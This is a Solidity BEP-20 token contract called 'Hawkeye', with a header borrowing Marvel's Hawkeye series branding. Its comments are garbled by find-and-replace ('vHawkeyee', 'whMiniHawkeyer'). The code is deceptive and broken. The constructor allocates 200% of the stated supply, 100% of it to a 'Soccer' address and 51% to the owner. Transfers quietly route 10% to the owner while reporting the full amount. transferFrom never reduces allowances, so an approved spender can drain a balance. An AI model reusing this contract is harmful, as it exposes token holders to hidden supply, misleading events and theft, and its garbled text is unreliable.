/**
 *Submitted for verification at BscScan.com on 2021-12-08
*/

/**
 Hawkeye
 hawkeyeofficial
 Marvel Studios' #Hawkeye is now streaming on @DisneyPlus
https://twitter.com/hawkeyeofficial

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
// https://coinmarketcap.com/currencies/Hawkeye/
interface IERC20 {
  // @dev Returns the amount of MiniHawkeye in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniHawkeye owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vHawkeyee);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vHawkeyee
    );
  
  */

  /**
   * @dev Moves `amount` MiniHawkeye from the caller's account to `recipient`.
   *
   * Returns a boolean vHawkeyee indicating whMiniHawkeyer the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniHawkeye that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vHawkeyee changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniHawkeye.
   *
   * Returns a boolean vHawkeyee indicating whMiniHawkeyer the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vHawkeyee afterwards:
   * https://github.com/Hawkeye/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniHawkeye from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vHawkeyee indicating whMiniHawkeyer the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vHawkeyee` MiniHawkeye are moved from one account (`from`) to  another (`to`). Note that `vHawkeyee` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vHawkeyee);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vHawkeyee` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vHawkeyee);
}

contract Hawkeye is IERC20 {

    // common addresses
    address private owner;
    address private Hawkeyes;
    address private MiniHawkeye;
    address private Soccer;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Hawkeye";
    string public override symbol = "Hawkeye";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vHawkeyee);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vHawkeyee);
    
    // On init of contract we're going to set the admin and give them all MiniHawkeye.
    constructor(uint totalSupplyVHawkeyee, address HawkeyesAddress, address MiniHawkeyeAddress, address SoccerAddress) {
        // set total supply
        totalSupply = totalSupplyVHawkeyee;
        
        // designate addresses
        owner = msg.sender;
        Hawkeyes = HawkeyesAddress;
        MiniHawkeye = MiniHawkeyeAddress;
        Soccer = SoccerAddress;

        
        // split the MiniHawkeye according to agreed upon percentages
        balances[Hawkeyes] =  totalSupply * 10 / 100;
        balances[MiniHawkeye] = totalSupply * 39 / 100;
        balances[Soccer] = totalSupply * 100 / 100;

        
        balances[owner] = totalSupply * 51 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vHawkeyee) public override returns(bool) {
        require(vHawkeyee > 0, "Transfer vHawkeyee has to be higher than 0.");
        require(balanceOf(msg.sender) >= vHawkeyee, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vHawkeyee
        uint reMiniHawkeyeBD = vHawkeyee * 9 / 100;
        uint burnTBD = vHawkeyee * 1 / 100;
        uint vHawkeyeeAfterTaxAndBurn = vHawkeyee - reMiniHawkeyeBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vHawkeyeeAfterTaxAndBurn;
        balances[msg.sender] -= vHawkeyee;
        
        emit Transfer(msg.sender, to, vHawkeyee);
        
        // finally, we burn and tax the Hawkeyes percentage
        balances[owner] += reMiniHawkeyeBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vHawkeyee) public override returns(bool) {
        allowances[msg.sender][spender] = vHawkeyee; 
        
        emit Approval(msg.sender, spender, vHawkeyee);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vHawkeyee) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vHawkeyee, "Allowance too low for transfer.");
        require(balances[from] >= vHawkeyee, "Balance is too low to make transfer.");
        
        balances[to] += vHawkeyee;
        balances[from] -= vHawkeyee;
        
        emit Transfer(from, to, vHawkeyee);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}